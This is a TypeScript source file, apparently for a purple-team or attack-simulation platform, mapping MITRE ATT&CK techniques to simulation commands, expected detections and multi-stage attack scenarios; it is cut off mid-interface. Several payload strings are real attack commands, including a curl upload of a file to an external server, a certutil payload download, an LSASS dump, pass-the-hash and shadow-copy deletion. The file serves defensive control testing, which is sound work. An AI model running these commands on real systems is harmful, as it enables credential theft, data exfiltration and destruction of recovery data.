import { randomUUID } from "crypto";

// ─── MITRE ATT&CK Tactics ────────────────────────────────────────────────────

export const MITRE_TACTICS = [
  { id: "TA0001", name: "Initial Access", description: "Techniques used to gain initial foothold in a network" },
  { id: "TA0002", name: "Execution", description: "Techniques that result in adversary-controlled code running" },
  { id: "TA0003", name: "Persistence", description: "Techniques used to maintain access across restarts" },
  { id: "TA0004", name: "Privilege Escalation", description: "Techniques used to gain higher-level permissions" },
  { id: "TA0005", name: "Defense Evasion", description: "Techniques used to avoid detection" },
  { id: "TA0006", name: "Credential Access", description: "Techniques for stealing credentials" },
  { id: "TA0007", name: "Discovery", description: "Techniques for understanding the environment" },
  { id: "TA0008", name: "Lateral Movement", description: "Techniques for moving through the environment" },
  { id: "TA0009", name: "Collection", description: "Techniques for gathering data of interest" },
  { id: "TA0010", name: "Exfiltration", description: "Techniques for stealing data" },
  { id: "TA0011", name: "Command and Control", description: "Techniques for communicating with compromised systems" },
  { id: "TA0040", name: "Impact", description: "Techniques to disrupt availability or compromise integrity" },
  { id: "TA0042", name: "Resource Development", description: "Techniques for establishing resources for operations" },
  { id: "TA0043", name: "Reconnaissance", description: "Techniques for gathering information about targets" },
] as const;

// ─── Comprehensive MITRE ATT&CK Technique Library ────────────────────────────

export interface MitreTechnique {
  id: string;
  tacticId: string;
  tacticName: string;
  name: string;
  description: string;
  platform: string[];
  severity: "info" | "low" | "medium" | "high" | "critical";
  simulationPayload: string;
  expectedDetection: string;
  controlMappings: string[];
}

export const MITRE_TECHNIQUE_LIBRARY: MitreTechnique[] = [
  // TA0043 — Reconnaissance
  {
    id: "T1595.001",
    tacticId: "TA0043",
    tacticName: "Reconnaissance",
    name: "Active Scanning: IP Block Scanning",
    description: "Adversaries scan IP blocks to gather victim network information",
    platform: ["network"],
    severity: "low",
    simulationPayload: "nmap -sS -p 1-1024 target_range/24",
    expectedDetection: "IDS/IPS should detect port scanning patterns",
    controlMappings: ["IDS", "Firewall", "Network Monitor"],
  },
  {
    id: "T1595.002",
    tacticId: "TA0043",
    tacticName: "Reconnaissance",
    name: "Active Scanning: Vulnerability Scanning",
    description: "Adversaries scan for vulnerabilities to exploit",
    platform: ["network"],
    severity: "medium",
    simulationPayload: "openvas --scan-target target_range/24",
    expectedDetection: "Vulnerability scanner traffic should trigger NIDS alerts",
    controlMappings: ["IDS", "WAF", "SIEM"],
  },
  {
    id: "T1589.001",
    tacticId: "TA0043",
    tacticName: "Reconnaissance",
    name: "Gather Victim Identity: Credentials",
    description: "Adversaries gather credentials through OSINT or breaches",
    platform: ["cloud", "saas"],
    severity: "high",
    simulationPayload: "Simulate credential stuffing from breach database",
    expectedDetection: "Identity provider should detect credential stuffing patterns",
    controlMappings: ["IdP", "MFA", "SIEM"],
  },

  // TA0042 — Resource Development
  {
    id: "T1583.001",
    tacticId: "TA0042",
    tacticName: "Resource Development",
    name: "Acquire Infrastructure: Domains",
    description: "Adversaries acquire domains for C2 or phishing",
    platform: ["cloud"],
    severity: "medium",
    simulationPayload: "Register lookalike domain matching org brand",
    expectedDetection: "Brand monitoring should detect typosquatting domains",
    controlMappings: ["Brand Monitor", "DNS Monitor", "Threat Intel"],
  },
  {
    id: "T1588.001",
    tacticId: "TA0042",
    tacticName: "Resource Development",
    name: "Obtain Capabilities: Malware",
    description: "Adversaries obtain malware tools for operations",
    platform: ["windows", "linux", "macos"],
    severity: "high",
    simulationPayload: "Download known RAT binary (defanged) to test EDR",
    expectedDetection: "EDR should quarantine known malware on download",
    controlMappings: ["EDR", "AV", "Sandbox"],
  },

  // TA0001 — Initial Access
  {
    id: "T1566.001",
    tacticId: "TA0001",
    tacticName: "Initial Access",
    name: "Phishing: Spearphishing Attachment",
    description: "Adversaries send targeted emails with malicious attachments",
    platform: ["windows", "macos", "linux"],
    severity: "high",
    simulationPayload: "Send test email with macro-enabled document to canary mailbox",
    expectedDetection: "Email gateway should block or quarantine macro-enabled attachments",
    controlMappings: ["Email Gateway", "EDR", "Sandbox"],
  },
  {
    id: "T1566.002",
    tacticId: "TA0001",
    tacticName: "Initial Access",
    name: "Phishing: Spearphishing Link",
    description: "Adversaries send targeted emails with malicious links",
    platform: ["windows", "macos", "linux"],
    severity: "high",
    simulationPayload: "Send test email with link to credential harvesting page",
    expectedDetection: "URL rewriting/scanning should detect malicious links",
    controlMappings: ["Email Gateway", "Web Proxy", "DNS Filter"],
  },
  {
    id: "T1190",
    tacticId: "TA0001",
    tacticName: "Initial Access",
    name: "Exploit Public-Facing Application",
    description: "Adversaries exploit vulnerabilities in internet-facing applications",
    platform: ["windows", "linux", "cloud"],
    severity: "critical",
    simulationPayload: "Attempt known CVE exploit against web application (safe payload)",
    expectedDetection: "WAF should block exploit attempts; IDS should alert",
    controlMappings: ["WAF", "IDS", "Patch Mgmt"],
  },
  {
    id: "T1078.004",
    tacticId: "TA0001",
    tacticName: "Initial Access",
    name: "Valid Accounts: Cloud Accounts",
    description: "Adversaries use compromised cloud credentials for access",
    platform: ["cloud", "saas"],
    severity: "critical",
    simulationPayload: "Attempt login from anomalous geolocation with valid credentials",
    expectedDetection: "UEBA should detect impossible travel; MFA should challenge",
    controlMappings: ["UEBA", "MFA", "CASB"],
  },
  {
    id: "T1133",
    tacticId: "TA0001",
    tacticName: "Initial Access",
    name: "External Remote Services",
    description: "Adversaries leverage VPN, RDP, or other remote services",
    platform: ["windows", "linux"],
    severity: "high",
    simulationPayload: "Attempt RDP brute-force from external IP",
    expectedDetection: "Failed login monitoring should detect brute-force and lock account",
    controlMappings: ["PAM", "SIEM", "Firewall"],
  },
  {
    id: "T1199",
    tacticId: "TA0001",
    tacticName: "Initial Access",
    name: "Trusted Relationship",
    description: "Adversaries exploit trusted third-party relationships",
    platform: ["cloud", "saas"],
    severity: "high",
    simulationPayload: "Simulate compromised vendor API key access",
    expectedDetection: "API gateway should detect anomalous vendor API patterns",
    controlMappings: ["API Gateway", "CASB", "Vendor Risk"],
  },

  // TA0002 — Execution
  {
    id: "T1059.001",
    tacticId: "TA0002",
    tacticName: "Execution",
    name: "Command and Scripting: PowerShell",
    description: "Adversaries abuse PowerShell for execution",
    platform: ["windows"],
    severity: "high",
    simulationPayload: "powershell -enc <base64-encoded-benign-command>",
    expectedDetection: "EDR should log and potentially block encoded PowerShell execution",
    controlMappings: ["EDR", "AMSI", "Script Block Logging"],
  },
  {
    id: "T1059.003",
    tacticId: "TA0002",
    tacticName: "Execution",
    name: "Command and Scripting: Windows Command Shell",
    description: "Adversaries use cmd.exe for execution",
    platform: ["windows"],
    severity: "medium",
    simulationPayload: "cmd.exe /c whoami & net user & ipconfig /all",
    expectedDetection: "Process monitoring should detect reconnaissance command chains",
    controlMappings: ["EDR", "SIEM", "Sysmon"],
  },
  {
    id: "T1059.004",
    tacticId: "TA0002",
    tacticName: "Execution",
    name: "Command and Scripting: Unix Shell",
    description: "Adversaries use bash/sh for execution on Linux/macOS",
    platform: ["linux", "macos"],
    severity: "medium",
    simulationPayload: "bash -c 'id; uname -a; cat /etc/passwd'",
    expectedDetection: "Auditd/osquery should detect suspicious shell command patterns",
    controlMappings: ["EDR", "Auditd", "osquery"],
  },
  {
    id: "T1204.001",
    tacticId: "TA0002",
    tacticName: "Execution",
    name: "User Execution: Malicious Link",
    description: "Adversary relies on user clicking a malicious link",
    platform: ["windows", "macos", "linux"],
    severity: "medium",
    simulationPayload: "Deploy benign phishing simulation link to test user awareness",
    expectedDetection: "Web proxy should block known-bad URLs; awareness training metrics",
    controlMappings: ["Web Proxy", "Security Awareness", "DNS Filter"],
  },
  {
    id: "T1053.005",
    tacticId: "TA0002",
    tacticName: "Execution",
    name: "Scheduled Task/Job: Scheduled Task",
    description: "Adversaries create scheduled tasks for execution",
    platform: ["windows"],
    severity: "high",
    simulationPayload: "schtasks /create /tn 'test_task' /tr 'calc.exe' /sc daily",
    expectedDetection: "EDR should alert on new scheduled task creation by non-admin",
    controlMappings: ["EDR", "Sysmon", "SIEM"],
  },

  // TA0003 — Persistence
  {
    id: "T1547.001",
    tacticId: "TA0003",
    tacticName: "Persistence",
    name: "Boot or Logon Autostart: Registry Run Keys",
    description: "Adversaries add programs to run keys for persistence",
    platform: ["windows"],
    severity: "high",
    simulationPayload: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v test /t REG_SZ /d calc.exe",
    expectedDetection: "EDR should detect and alert on Run key modifications",
    controlMappings: ["EDR", "Sysmon", "Registry Monitor"],
  },
  {
    id: "T1136.001",
    tacticId: "TA0003",
    tacticName: "Persistence",
    name: "Create Account: Local Account",
    description: "Adversaries create local accounts for persistence",
    platform: ["windows", "linux", "macos"],
    severity: "high",
    simulationPayload: "net user testuser P@ssw0rd! /add (Windows) or useradd testuser (Linux)",
    expectedDetection: "SIEM should alert on new local account creation outside change window",
    controlMappings: ["SIEM", "PAM", "EDR"],
  },
  {
    id: "T1098.001",
    tacticId: "TA0003",
    tacticName: "Persistence",
    name: "Account Manipulation: Additional Cloud Credentials",
    description: "Adversaries add credentials to cloud accounts",
    platform: ["cloud"],
    severity: "critical",
    simulationPayload: "Add new access key to IAM user or service principal",
    expectedDetection: "CloudTrail/Activity Log should alert on credential additions",
    controlMappings: ["CSPM", "SIEM", "IAM Monitor"],
  },
  {
    id: "T1505.003",
    tacticId: "TA0003",
    tacticName: "Persistence",
    name: "Server Software Component: Web Shell",
    description: "Adversaries install web shells on compromised servers",
    platform: ["windows", "linux"],
    severity: "critical",
    simulationPayload: "Deploy EICAR-equivalent web shell test file to web root",
    expectedDetection: "File integrity monitoring should detect new files in web root",
    controlMappings: ["FIM", "WAF", "EDR"],
  },
  {
    id: "T1543.003",
    tacticId: "TA0003",
    tacticName: "Persistence",
    name: "Create or Modify System Process: Windows Service",
    description: "Adversaries create or modify Windows services",
    platform: ["windows"],
    severity: "high",
    simulationPayload: "sc create TestSvc binPath= calc.exe start= auto",
    expectedDetection: "EDR should alert on new service creation by non-admin process",
    controlMappings: ["EDR", "Sysmon", "SIEM"],
  },

  // TA0004 — Privilege Escalation
  {
    id: "T1068",
    tacticId: "TA0004",
    tacticName: "Privilege Escalation",
    name: "Exploitation for Privilege Escalation",
    description: "Adversaries exploit vulnerabilities to escalate privileges",
    platform: ["windows", "linux", "macos"],
    severity: "critical",
    simulationPayload: "Attempt known kernel exploit (safe PoC) to elevate from user to root",
    expectedDetection: "EDR should detect exploit patterns; kernel-level monitoring should alert",
    controlMappings: ["EDR", "Kernel Monitor", "Patch Mgmt"],
  },
  {
    id: "T1548.002",
    tacticId: "TA0004",
    tacticName: "Privilege Escalation",
    name: "Abuse Elevation Control: Bypass UAC",
    description: "Adversaries bypass Windows UAC to elevate privileges",
    platform: ["windows"],
    severity: "high",
    simulationPayload: "Use fodhelper.exe UAC bypass technique (benign payload)",
    expectedDetection: "EDR should detect known UAC bypass techniques",
    controlMappings: ["EDR", "Sysmon", "AMSI"],
  },
  {
    id: "T1078.001",
    tacticId: "TA0004",
    tacticName: "Privilege Escalation",
    name: "Valid Accounts: Default Accounts",
    description: "Adversaries use default vendor credentials",
    platform: ["windows", "linux", "network"],
    severity: "high",
    simulationPayload: "Attempt login with common default credentials on network devices",
    expectedDetection: "PAM should detect default credential usage; asset inventory flags",
    controlMappings: ["PAM", "Vuln Scanner", "Asset Mgmt"],
  },

  // TA0005 — Defense Evasion
  {
    id: "T1070.001",
    tacticId: "TA0005",
    tacticName: "Defense Evasion",
    name: "Indicator Removal: Clear Windows Event Logs",
    description: "Adversaries clear event logs to cover tracks",
    platform: ["windows"],
    severity: "high",
    simulationPayload: "wevtutil cl Security (test with dedicated log)",
    expectedDetection: "SIEM should alert on event log clearing; forwarded logs preserved",
    controlMappings: ["SIEM", "Log Forwarding", "EDR"],
  },
  {
    id: "T1027",
    tacticId: "TA0005",
    tacticName: "Defense Evasion",
    name: "Obfuscated Files or Information",
    description: "Adversaries obfuscate payloads to evade detection",
    platform: ["windows", "linux", "macos"],
    severity: "high",
    simulationPayload: "Execute base64-encoded benign script to test content inspection",
    expectedDetection: "AMSI/EDR should decode and inspect obfuscated content",
    controlMappings: ["AMSI", "EDR", "Sandbox"],
  },
  {
    id: "T1562.001",
    tacticId: "TA0005",
    tacticName: "Defense Evasion",
    name: "Impair Defenses: Disable or Modify Tools",
    description: "Adversaries disable security tools",
    platform: ["windows", "linux", "macos"],
    severity: "critical",
    simulationPayload: "Attempt to stop EDR service or disable Windows Defender",
    expectedDetection: "Tamper protection should prevent disabling; SIEM should alert",
    controlMappings: ["Tamper Protection", "SIEM", "SOC"],
  },
  {
    id: "T1036.005",
    tacticId: "TA0005",
    tacticName: "Defense Evasion",
    name: "Masquerading: Match Legitimate Name or Location",
    description: "Adversaries masquerade malware as legitimate files",
    platform: ["windows", "linux"],
    severity: "medium",
    simulationPayload: "Place benign executable named svchost.exe in user temp directory",
    expectedDetection: "EDR should detect processes running from unexpected paths",
    controlMappings: ["EDR", "Application Control", "FIM"],
  },
  {
    id: "T1055.001",
    tacticId: "TA0005",
    tacticName: "Defense Evasion",
    name: "Process Injection: DLL Injection",
    description: "Adversaries inject malicious code into running processes",
    platform: ["windows"],
    severity: "critical",
    simulationPayload: "Inject benign DLL into target process using CreateRemoteThread",
    expectedDetection: "EDR should detect cross-process injection patterns",
    controlMappings: ["EDR", "Sysmon", "Memory Protection"],
  },

  // TA0006 — Credential Access
  {
    id: "T1003.001",
    tacticId: "TA0006",
    tacticName: "Credential Access",
    name: "OS Credential Dumping: LSASS Memory",
    description: "Adversaries dump LSASS to extract credentials",
    platform: ["windows"],
    severity: "critical",
    simulationPayload: "procdump -ma lsass.exe lsass.dmp (safe alternative: mimikatz simulation)",
    expectedDetection: "EDR should block LSASS access; Credential Guard should protect",
    controlMappings: ["EDR", "Credential Guard", "LSA Protection"],
  },
  {
    id: "T1110.001",
    tacticId: "TA0006",
    tacticName: "Credential Access",
    name: "Brute Force: Password Guessing",
    description: "Adversaries attempt to brute-force credentials",
    platform: ["windows", "linux", "cloud"],
    severity: "medium",
    simulationPayload: "Attempt 50 failed logins against test account in rapid succession",
    expectedDetection: "Account lockout should trigger; SIEM should alert on brute-force",
    controlMappings: ["Account Lockout", "SIEM", "MFA"],
  },
  {
    id: "T1558.003",
    tacticId: "TA0006",
    tacticName: "Credential Access",
    name: "Steal Kerberos Tickets: Kerberoasting",
    description: "Adversaries request service tickets for offline cracking",
    platform: ["windows"],
    severity: "high",
    simulationPayload: "Request TGS for service accounts with SPNs (Rubeus kerberoast)",
    expectedDetection: "SIEM should detect mass TGS requests; honeypot SPN should alert",
    controlMappings: ["SIEM", "Honeypot SPN", "PAM"],
  },
  {
    id: "T1552.001",
    tacticId: "TA0006",
    tacticName: "Credential Access",
    name: "Unsecured Credentials: Credentials In Files",
    description: "Adversaries search for credentials stored in files",
    platform: ["windows", "linux", "macos"],
    severity: "medium",
    simulationPayload: "findstr /si password *.txt *.xml *.config (Windows)",
    expectedDetection: "DLP should detect credential file searches; EDR behavioral alert",
    controlMappings: ["DLP", "EDR", "Secret Scanner"],
  },

  // TA0007 — Discovery
  {
    id: "T1087.002",
    tacticId: "TA0007",
    tacticName: "Discovery",
    name: "Account Discovery: Domain Account",
    description: "Adversaries enumerate domain accounts",
    platform: ["windows"],
    severity: "medium",
    simulationPayload: "net user /domain && net group 'Domain Admins' /domain",
    expectedDetection: "SIEM should detect mass LDAP enumeration queries",
    controlMappings: ["SIEM", "EDR", "AD Monitor"],
  },
  {
    id: "T1046",
    tacticId: "TA0007",
    tacticName: "Discovery",
    name: "Network Service Discovery",
    description: "Adversaries scan for running services on remote hosts",
    platform: ["windows", "linux", "macos"],
    severity: "medium",
    simulationPayload: "nmap -sV -p 22,80,443,445,3389 target_subnet/24",
    expectedDetection: "IDS should detect internal port scanning activity",
    controlMappings: ["IDS", "NDR", "Microsegmentation"],
  },
  {
    id: "T1082",
    tacticId: "TA0007",
    tacticName: "Discovery",
    name: "System Information Discovery",
    description: "Adversaries gather system information",
    platform: ["windows", "linux", "macos"],
    severity: "low",
    simulationPayload: "systeminfo (Windows) or uname -a && cat /etc/os-release (Linux)",
    expectedDetection: "EDR should correlate recon commands as pre-attack behavior",
    controlMappings: ["EDR", "UEBA", "SIEM"],
  },
  {
    id: "T1518.001",
    tacticId: "TA0007",
    tacticName: "Discovery",
    name: "Software Discovery: Security Software Discovery",
    description: "Adversaries identify installed security tools",
    platform: ["windows", "linux"],
    severity: "medium",
    simulationPayload: "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName",
    expectedDetection: "EDR should detect security software enumeration attempts",
    controlMappings: ["EDR", "SIEM", "Deception"],
  },

  // TA0008 — Lateral Movement
  {
    id: "T1021.001",
    tacticId: "TA0008",
    tacticName: "Lateral Movement",
    name: "Remote Services: Remote Desktop Protocol",
    description: "Adversaries use RDP for lateral movement",
    platform: ["windows"],
    severity: "high",
    simulationPayload: "Attempt RDP connection from compromised host to adjacent server",
    expectedDetection: "NDR should detect anomalous RDP connections; PAM should enforce MFA",
    controlMappings: ["NDR", "PAM", "Microsegmentation"],
  },
  {
    id: "T1021.002",
    tacticId: "TA0008",
    tacticName: "Lateral Movement",
    name: "Remote Services: SMB/Windows Admin Shares",
    description: "Adversaries use SMB shares for lateral movement",
    platform: ["windows"],
    severity: "high",
    simulationPayload: "net use \\\\target\\C$ /user:domain\\admin (with test credentials)",
    expectedDetection: "SIEM should detect admin share access; NDR should flag anomalous SMB",
    controlMappings: ["SIEM", "NDR", "Microsegmentation"],
  },
  {
    id: "T1550.002",
    tacticId: "TA0008",
    tacticName: "Lateral Movement",
    name: "Use Alternate Authentication: Pass the Hash",
    description: "Adversaries use stolen NTLM hashes for authentication",
    platform: ["windows"],
    severity: "critical",
    simulationPayload: "pth-winexe -U domain/user%hash //target cmd.exe (safe simulation)",
    expectedDetection: "EDR should detect pass-the-hash authentication patterns",
    controlMappings: ["EDR", "Credential Guard", "SIEM"],
  },
  {
    id: "T1021.006",
    tacticId: "TA0008",
    tacticName: "Lateral Movement",
    name: "Remote Services: Windows Remote Management",
    description: "Adversaries use WinRM for lateral movement",
    platform: ["windows"],
    severity: "high",
    simulationPayload: "Invoke-Command -ComputerName target -ScriptBlock {whoami}",
    expectedDetection: "WinRM logging should capture; SIEM should detect lateral WinRM",
    controlMappings: ["SIEM", "WinRM Logging", "Microsegmentation"],
  },

  // TA0009 — Collection
  {
    id: "T1560.001",
    tacticId: "TA0009",
    tacticName: "Collection",
    name: "Archive Collected Data: Archive via Utility",
    description: "Adversaries archive collected data for exfiltration",
    platform: ["windows", "linux", "macos"],
    severity: "medium",
    simulationPayload: "7z a -p exfil.7z C:\\Users\\target\\Documents\\*.docx",
    expectedDetection: "DLP should detect bulk archiving of sensitive files",
    controlMappings: ["DLP", "EDR", "UEBA"],
  },
  {
    id: "T1114.002",
    tacticId: "TA0009",
    tacticName: "Collection",
    name: "Email Collection: Remote Email Collection",
    description: "Adversaries collect email via API or protocol",
    platform: ["cloud", "saas"],
    severity: "high",
    simulationPayload: "Use Graph API to bulk-download mailbox contents (test account)",
    expectedDetection: "CASB should detect mass email download; audit logs should capture",
    controlMappings: ["CASB", "SIEM", "DLP"],
  },
  {
    id: "T1005",
    tacticId: "TA0009",
    tacticName: "Collection",
    name: "Data from Local System",
    description: "Adversaries collect data from local file systems",
    platform: ["windows", "linux", "macos"],
    severity: "medium",
    simulationPayload: "Enumerate and copy files matching *.pem, *.key, *.pfx patterns",
    expectedDetection: "DLP should detect sensitive file access patterns",
    controlMappings: ["DLP", "FIM", "EDR"],
  },

  // TA0010 — Exfiltration
  {
    id: "T1048.002",
    tacticId: "TA0010",
    tacticName: "Exfiltration",
    name: "Exfiltration Over Alternative Protocol: Asymmetric Encrypted",
    description: "Adversaries exfiltrate data over encrypted channels",
    platform: ["windows", "linux"],
    severity: "high",
    simulationPayload: "curl -X POST https://external-server/upload -d @sensitive_file.enc",
    expectedDetection: "DLP should inspect encrypted uploads; proxy should detect anomalous egress",
    controlMappings: ["DLP", "Web Proxy", "NDR"],
  },
  {
    id: "T1567.002",
    tacticId: "TA0010",
    tacticName: "Exfiltration",
    name: "Exfiltration Over Web Service: Cloud Storage",
    description: "Adversaries use cloud storage for exfiltration",
    platform: ["windows", "linux", "macos"],
    severity: "high",
    simulationPayload: "Upload test data to personal Dropbox/GDrive via API",
    expectedDetection: "CASB should block unsanctioned cloud storage uploads",
    controlMappings: ["CASB", "DLP", "Web Proxy"],
  },
  {
    id: "T1041",
    tacticId: "TA0010",
    tacticName: "Exfiltration",
    name: "Exfiltration Over C2 Channel",
    description: "Adversaries exfiltrate data over the C2 channel",
    platform: ["windows", "linux"],
    severity: "critical",
    simulationPayload: "Exfiltrate data embedded in DNS TXT queries to external resolver",
    expectedDetection: "DNS monitoring should detect data exfiltration via DNS tunneling",
    controlMappings: ["DNS Monitor", "NDR", "SIEM"],
  },

  // TA0011 — Command and Control
  {
    id: "T1071.001",
    tacticId: "TA0011",
    tacticName: "Command and Control",
    name: "Application Layer Protocol: Web Protocols",
    description: "Adversaries use HTTP/HTTPS for C2 communication",
    platform: ["windows", "linux", "macos"],
    severity: "high",
    simulationPayload: "Simulate C2 beaconing over HTTPS with periodic callbacks",
    expectedDetection: "NDR should detect beaconing patterns; proxy should flag anomalous domains",
    controlMappings: ["NDR", "Web Proxy", "Threat Intel"],
  },
  {
    id: "T1071.004",
    tacticId: "TA0011",
    tacticName: "Command and Control",
    name: "Application Layer Protocol: DNS",
    description: "Adversaries use DNS for C2 communication",
    platform: ["windows", "linux", "macos"],
    severity: "high",
    simulationPayload: "dnscat2 simulation — encode commands in DNS queries",
    expectedDetection: "DNS monitoring should detect DNS tunneling and anomalous query patterns",
    controlMappings: ["DNS Monitor", "NDR", "SIEM"],
  },
  {
    id: "T1105",
    tacticId: "TA0011",
    tacticName: "Command and Control",
    name: "Ingress Tool Transfer",
    description: "Adversaries transfer tools from external systems",
    platform: ["windows", "linux", "macos"],
    severity: "high",
    simulationPayload: "certutil -urlcache -split -f http://external/payload.exe (benign test)",
    expectedDetection: "EDR should detect LOLBin download patterns; proxy should inspect",
    controlMappings: ["EDR", "Web Proxy", "Application Control"],
  },
  {
    id: "T1572",
    tacticId: "TA0011",
    tacticName: "Command and Control",
    name: "Protocol Tunneling",
    description: "Adversaries tunnel C2 traffic through legitimate protocols",
    platform: ["windows", "linux"],
    severity: "high",
    simulationPayload: "SSH tunnel through port 443 to disguise traffic as HTTPS",
    expectedDetection: "DPI should detect protocol mismatches; NDR should flag tunneling",
    controlMappings: ["DPI", "NDR", "Firewall"],
  },

  // TA0040 — Impact
  {
    id: "T1486",
    tacticId: "TA0040",
    tacticName: "Impact",
    name: "Data Encrypted for Impact (Ransomware)",
    description: "Adversaries encrypt data for extortion",
    platform: ["windows", "linux"],
    severity: "critical",
    simulationPayload: "Encrypt test files with reversible key in isolated sandbox directory",
    expectedDetection: "EDR should detect rapid file encryption patterns; canary files should trigger",
    controlMappings: ["EDR", "Canary Files", "Backup Verification"],
  },
  {
    id: "T1490",
    tacticId: "TA0040",
    tacticName: "Impact",
    name: "Inhibit System Recovery",
    description: "Adversaries delete backups and shadow copies",
    platform: ["windows"],
    severity: "critical",
    simulationPayload: "vssadmin delete shadows /all /quiet (test in isolated VM)",
    expectedDetection: "EDR should block shadow copy deletion; SIEM should alert",
    controlMappings: ["EDR", "Backup Monitor", "SIEM"],
  },
  {
    id: "T1498.001",
    tacticId: "TA0040",
    tacticName: "Impact",
    name: "Network Denial of Service: Direct Network Flood",
    description: "Adversaries flood networks to cause DoS",
    platform: ["network"],
    severity: "high",
    simulationPayload: "Simulate volumetric traffic burst against test endpoint",
    expectedDetection: "DDoS protection should absorb; WAF should rate-limit",
    controlMappings: ["DDoS Protection", "WAF", "CDN"],
  },
  {
    id: "T1485",
    tacticId: "TA0040",
    tacticName: "Impact",
    name: "Data Destruction",
    description: "Adversaries destroy data to disrupt operations",
    platform: ["windows", "linux"],
    severity: "critical",
    simulationPayload: "Attempt mass file deletion in test directory (isolated sandbox)",
    expectedDetection: "FIM should detect mass deletion; backup should enable recovery",
    controlMappings: ["FIM", "Backup", "EDR"],
  },
];

// ─── Control Types ───────────────────────────────────────────────────────────

export const CONTROL_TYPES = [
  "EDR",
  "SIEM",
  "NDR",
  "WAF",
  "IDS",
  "Firewall",
  "MFA",
  "PAM",
  "DLP",
  "CASB",
  "Web Proxy",
  "DNS Monitor",
  "Email Gateway",
  "Sandbox",
  "AMSI",
  "Application Control",
  "FIM",
  "Backup",
  "Credential Guard",
  "CSPM",
  "Tamper Protection",
  "Microsegmentation",
  "Deception",
  "Threat Intel",
  "Patch Mgmt",
  "Vuln Scanner",
  "Secret Scanner",
  "Asset Mgmt",
  "SOC",
  "Identity Provider",
  "UEBA",
  "CDN",
  "DDoS Protection",
] as const;

// ─── Purple Team Scenario Templates ──────────────────────────────────────────

export interface PurpleTeamScenario {
  id: string;
  name: string;
  description: string;
  attackScenario: string;
  mitreChain: string[];
  redTeamActions: string;
  blueTeamExpected: string;
}

export const PURPLE_TEAM_SCENARIOS: PurpleTeamScenario[] = [
  {
    id: "pts-001",
    name: "Ransomware Kill Chain",
    description: "Full ransomware attack simulation from phishing to encryption",
    attackScenario:
      "Phishing email → macro execution → persistence → privilege escalation → lateral movement → data collection → ransomware deployment",
    mitreChain: ["T1566.001", "T1059.001", "T1547.001", "T1548.002", "T1021.002", "T1560.001", "T1486"],
    redTeamActions:
      "1. Send spearphishing email with macro doc\n2. Execute PowerShell download cradle\n3. Establish persistence via Run key\n4. Bypass UAC for admin access\n5. Move laterally via SMB\n6. Archive sensitive files\n7. Deploy ransomware (simulated)",
    blueTeamExpected:
      "Email gateway blocks attachment OR EDR blocks macro execution OR persistence detection alerts SOC OR privilege escalation triggers alert OR lateral movement detected by NDR",
  },
  {
    id: "pts-002",
    name: "APT Data Exfiltration",
    description: "Advanced persistent threat with slow data exfiltration over DNS",
    attackScenario: "Valid cloud account → discovery → credential dumping → email collection → DNS exfiltration",
    mitreChain: ["T1078.004", "T1087.002", "T1003.001", "T1114.002", "T1071.004"],
    redTeamActions:
      "1. Login with compromised cloud credentials\n2. Enumerate domain accounts and groups\n3. Dump LSASS for additional credentials\n4. Bulk-download mailbox via Graph API\n5. Exfiltrate data encoded in DNS queries",
    blueTeamExpected:
      "UEBA detects anomalous login OR SIEM detects LDAP enumeration OR EDR blocks LSASS dump OR CASB detects mass download OR DNS monitor detects tunneling",
  },
  {
    id: "pts-003",
    name: "Supply Chain Compromise",
    description: "Compromise via trusted vendor relationship and cloud persistence",
    attackScenario:
      "Trusted relationship exploit → cloud credential injection → IAM persistence → cloud storage exfiltration",
    mitreChain: ["T1199", "T1078.004", "T1098.001", "T1567.002"],
    redTeamActions:
      "1. Exploit vendor API access\n2. Use vendor credentials for cloud access\n3. Add additional IAM credentials for persistence\n4. Upload sensitive data to personal cloud storage",
    blueTeamExpected:
      "API gateway detects anomalous vendor access OR CSPM detects new credentials OR CASB blocks unsanctioned uploads",
  },
  {
    id: "pts-004",
    name: "Insider Threat — Credential Theft",
    description: "Malicious insider steals credentials and covers tracks",
    attackScenario: "Credential file search → Kerberoasting → data archival → log clearing → C2 exfiltration",
    mitreChain: ["T1552.001", "T1558.003", "T1560.001", "T1070.001", "T1041"],
    redTeamActions:
      "1. Search for credentials in files\n2. Kerberoast service accounts\n3. Archive collected data\n4. Clear event logs\n5. Exfiltrate over C2 channel",
    blueTeamExpected:
      "DLP detects credential search OR SIEM detects mass TGS requests OR EDR detects archiving OR SIEM alerts on log clearing",
  },
  {
    id: "pts-005",
    name: "Cloud Infrastructure Attack",
    description: "Cloud-native attack targeting infrastructure and disabling defenses",
    attackScenario: "Vulnerability exploit → cloud account compromise → defense evasion → service disruption",
    mitreChain: ["T1190", "T1078.004", "T1562.001", "T1498.001"],
    redTeamActions:
      "1. Exploit public-facing application vulnerability\n2. Pivot to cloud account access\n3. Attempt to disable security monitoring\n4. Launch DoS against internal services",
    blueTeamExpected:
      "WAF blocks exploit OR UEBA detects compromise OR tamper protection prevents disabling OR DDoS protection absorbs",
  },
  {
    id: "pts-006",
    name: "Web Application Attack Chain",
    description: "OWASP Top 10 attack chain targeting web applications",
    attackScenario: "Vulnerability scanning → SQL injection → web shell → data theft → defacement",
    mitreChain: ["T1595.002", "T1190", "T1505.003", "T1005", "T1485"],
    redTeamActions:
      "1. Scan for web application vulnerabilities\n2. Exploit SQL injection for initial access\n3. Deploy web shell for persistence\n4. Collect sensitive data from application DB\n5. Attempt data destruction/defacement",
    blueTeamExpected: "WAF detects scanning OR IDS blocks SQLi OR FIM detects web shell OR DLP prevents data theft",
  },
];

// ─── In-memory stores ────────────────────────────────────────────────────────

function genId(prefix: string): string {
  return `${prefix}-${randomUUID().slice(0, 8)}`;
}

function randomBetween(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

export interface SimulationResult {
  id: string;
  orgId: string;
  techniqueId: string;
  techniqueName: string;
  tacticId: string;
  tacticName: string;
  platform: string;
  severity: string;
  status: "pending" | "running" | "passed" | "failed" | "error";
  verdict: "blocked" | "detected" | "bypassed" | "inconclusive";
  durationMs: number;
  output: string;
  controlsTested: string[];
  trigger: string;
  executedBy: string;
  executedAt: string;
}

export interface ControlScore {
  controlName: string;
  controlType: string;
  totalTests: number;
  passedTests: number;
  failedTests: number;
  effectivenessScore: number;
  mitreIds: string[];
  status: "effective" | "partial" | "failing" | "untested";
  lastTestedAt: string | null;
  trend: "improving" | "stable" | "declining";
}

export interface GapEntry {
  techniqueId: string;
  tacticId: string;
  tacticName: string;
  techniqueName: string;
  coverageStatus: "full" | "partial" | "no_coverage";
  detectionRuleCount: number;
